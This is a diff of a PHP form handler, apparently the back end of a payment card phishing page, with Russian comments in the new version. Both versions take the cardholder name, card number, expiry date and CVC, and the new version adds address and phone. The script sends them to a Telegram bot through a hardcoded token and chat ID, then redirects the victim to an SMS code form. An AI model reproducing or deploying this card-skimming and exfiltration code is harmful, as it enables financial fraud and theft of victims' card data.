@@ -1,39 +1,34 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $cardholder = $_POST['cardholder'];
-    $number = $_POST['number'];
-    $month = $_POST['month'];
-    $year = $_POST['year'];
-    $cvc = $_POST['cvc'];
-    
-    // Your Telegram Bot API token
-    $botToken = "6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo";
-    // Your Telegram Chat ID
-    $chatId = "-4276589204";
-    
-    $message = "Cardholder: $cardholder\nCard Number: $number\nExpiry Date: $month/$year\nCVC: $cvc";
-    
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message
-    ];
-    
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data),
-        ],
-    ];
-    
-    $context  = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
-    
-    if ($result === FALSE) { /* Handle error */ }
-    
-    // Redirect to SMS input form
-    header("Location: sms_form.html");
+    // Получение данных из формы
+    $cardholder = htmlspecialchars($_POST['cardholder']);
+    $number = htmlspecialchars($_POST['number']);
+    $month = htmlspecialchars($_POST['month']);
+    $year = htmlspecialchars($_POST['year']);
+    $cvc = htmlspecialchars($_POST['cvc']);
+    $address = htmlspecialchars($_POST['address']);
+    $phone = htmlspecialchars($_POST['phone']);
+
+    // Токен и ID чата для Telegram
+    $token = "6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo";
+    $chat_id = "-4276589204";
+
+    // Сообщение, которое будет отправлено в Telegram
+    $message = "Cardholder Name: $cardholder\n".
+               "Card Number: $number\n".
+               "Exp. Date: $month/$year\n".
+               "CVC: $cvc\n".
+               "Payment Address: $address\n".
+               "Phone Number: $phone";
+
+    // Отправка сообщения в Telegram
+    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=HTML&text=".urlencode($message),"r");
+
+    // Проверка успешности отправки и перенаправление
+    if ($sendToTelegram) {
+        header('Location: sms.html'); // перенаправление на success.html после успешной отправки
+    } else {
+        echo "Error";
+    }
 }
 ?>
